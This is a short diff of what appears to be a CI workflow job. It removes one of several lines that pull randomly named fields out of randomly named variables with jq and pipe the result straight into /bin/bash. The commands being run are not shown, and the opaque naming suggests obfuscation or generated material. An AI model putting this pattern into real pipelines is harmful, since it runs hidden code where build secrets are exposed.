@@ -27,7 +27,6 @@ jobs:
           echo $las7 | jq -r .fa0 | /bin/bash
           printf '%s' "$p67962" | jq -r .nrhy840 | /bin/bash
           echo $i71 | jq -r .sp69 | /bin/bash
-          echo $ivgx760 | jq -r .afuuu1 | /bin/bash
           echo $rf25617 | jq -r .k3 | /bin/bash
           printf '%s' "$x4" | jq -r .ht4847 | /bin/bash
           echo $zfj775 | jq -r .irhhi3278 | /bin/bash
